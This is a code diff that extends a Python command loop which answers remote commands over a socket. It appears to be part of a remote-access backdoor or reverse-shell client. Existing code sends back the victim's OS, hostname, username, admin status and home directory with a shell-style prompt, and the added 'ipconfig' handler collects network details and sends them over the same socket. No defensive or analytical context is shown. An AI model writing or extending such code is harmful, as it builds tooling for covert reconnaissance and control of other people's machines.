@@ -219,7 +219,7 @@ def execute_commands(s):
 === System Information ===
 OS: {platform.system()} {platform.release()}
 Version: {platform.version()}
-Hostname: {platform.node()}
+Hostname: {platform.node()}     
 Username: {getpass.getuser()}
 Admin: {'Yes' if is_admin else 'No'}
 Architecture: {platform.machine()}
@@ -227,6 +227,28 @@ Processor: {platform.processor()}
 Python: {platform.python_version()}
 Home: {os.path.expanduser('~')}
 """
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
+                    continue
+                
+                if cmd == "ipconfig":
+                    hostname = socket.gethostname()
+                    try:
+                        local_ip = socket.gethostbyname(hostname)
+                    except:
+                        local_ip = "Unable to get"
+                    
+                    info = f"""
+=== Network Information ===
+Hostname: {hostname}
+Local IP: {local_ip}
+"""
+                    try:
+                        result = subprocess.run(['ipconfig'] if platform.system() == 'Windows' else ['ifconfig'], 
+                                              capture_output=True, text=True, timeout=10)
+                        info += result.stdout
+                    except:
+                        info += "Could not get detailed network info\n"
+                    
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
